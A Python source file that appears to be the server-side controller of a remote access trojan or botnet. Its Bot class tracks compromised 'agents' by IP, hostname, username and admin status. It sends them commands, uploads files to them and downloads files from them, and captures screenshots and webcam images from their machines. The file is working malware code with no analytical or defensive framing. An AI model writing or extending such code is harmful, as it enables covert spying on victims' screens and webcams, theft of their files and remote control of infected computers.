import json
import hashlib
import os
import socket
import ssl
import sys
import time
import threading
import logging
from datetime import datetime

# Constants
SCREENSHOT_DIR = 'images/screenshots'
WEBCAM_DIR = './images/webcam'
IMAGE_CHUNK_SIZE = 10485760 #10MB
SCREENSHOT_TIMEOUT = 10 # seconds
WEBCAM_TIMEOUT = 10 # seconds
ENCODING = 'utf-8'

class Bot:
    botList = {}
    botCount = 0
    
    def __init__(self, target, ip):
        self.target = target
        self.ip = ip
        self.alias = f"Agent_{Bot.botCount}"
        self.id = Bot.botCount
        self.connected_time = datetime.now()
        self.os_type = "Unknown"
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.is_admin = False
        self.last_seen = datetime.now()
        Bot.botList[self.id] = self
        Bot.botCount += 1
        logging.info(f"Bot initialized - ID: {self.id} | IP: {self.ip} | Connected at: {self.connected_time}")

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            length = len(json_data)
            length_header = f"{length:<10}".encode()
            self.target.send(length_header)
            self.target.send(json_data.encode())
            return True
        except Exception as e:
            logging.error(f"Error sending data to Session {self.id}: {e}")
            return False

    def reliable_recv(self):
        try:
            length_header = self.target.recv(10).decode().strip()
            if not length_header:
                return None
            
            length = int(length_header)
            chunks = []
            bytes_received = 0
            while bytes_received < length:
                chunk = self.target.recv(min(length - bytes_received, 4096))
                if not chunk:
                    return None
                chunks.append(chunk)
                bytes_received += len(chunk)
            
            data = b''.join(chunks).decode()
            
            try:
                return json.loads(data)
            except json.JSONDecodeError:
                return data.strip()
            
        except Exception as e:
            logging.error(f"Error receiving data from Session {self.id}: {e}")
            return None

    def upload_file(self, file_name):
        try:
            f = open(file_name, 'rb')
            data = f.read()
            f.close()
            logging.info(f"File upload started - Session {self.id} | File: {file_name}")
        except FileNotFoundError:
            logging.error(f"File not found - Session {self.id} | File: {file_name}")
            return f"The file {file_name} does not exist."
        except IOError as e:
            logging.error(f"IO Error during file upload - Session {self.id} | File: {file_name} | Error: {e}")
            return f"Error reading from {file_name}: {e}"

        try:
            self.target.send(data)
            logging.info(f"File upload completed - Session {self.id} | File: {file_name}")
        except socket.error as e:
            logging.error(f"Socket error during file upload - Session {self.id} | Error: {e}")
            return f"Error sending data: {e}"

        return f"File {file_name} uploaded successfully."

    def download_file(self, file_name):
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            return f"Error opening file {file_name} for writing: {e}"
            
        self.target.settimeout(2)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(1024)
                except socket.timeout:
                    break
        except socket.error as e:
            f.close()
            return f"Error receiving data: {e}"
        finally:
            f.close()
        self.target.settimeout(None)
        return f"File {file_name} downloaded successfully."

    def screenshot(self):
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)
        count = len(os.listdir(SCREENSHOT_DIR))
        file_name = f'{SCREENSHOT_DIR}/screenshot_{count}.png'
        
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            return f"Error opening file {file_name} for writing: {e}"
            
        self.target.settimeout(SCREENSHOT_TIMEOUT)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
                except socket.timeout:
                    break
        except socket.error as e:
            f.close()
            return f"Error receiving data: {e}"
        finally:
            f.close()
        self.target.settimeout(None)
        return f"Screenshot saved to {file_name}"

    def webcam(self):
        os.makedirs(WEBCAM_DIR, exist_ok=True)
        count = len(os.listdir(WEBCAM_DIR))
        file_name = f'{WEBCAM_DIR}/webcam_pic_{count}.jpg'
        
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            return f"Error opening file {file_name} for writing: {e}"
            
        self.target.settimeout(WEBCAM_TIMEOUT)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
                except socket.timeout:
                    break
        except socket.error as e:
            f.close()
            return f"Error receiving data: {e}"
        finally:
            f.close()
        self.target.settimeout(None)
        return f"Webcam image saved to {file_name}"

    def kill(self):
        try:
            self.reliable_send('quit')
            self.target.close()
            duration = datetime.now() - self.connected_time
            logging.info(f"Session {self.id} terminated - Duration: {duration}")
            del Bot.botList[self.id]
            return f"Session terminated successfully - Duration: {duration}"
        except Exception as e:
            logging.error(f"Error terminating Session {self.id}: {e}")
            return f"Error terminating session: {e}" 

    def update_last_seen(self):
        self.last_seen = datetime.now()
        logging.debug(f"Updated last seen for Session {self.id}") 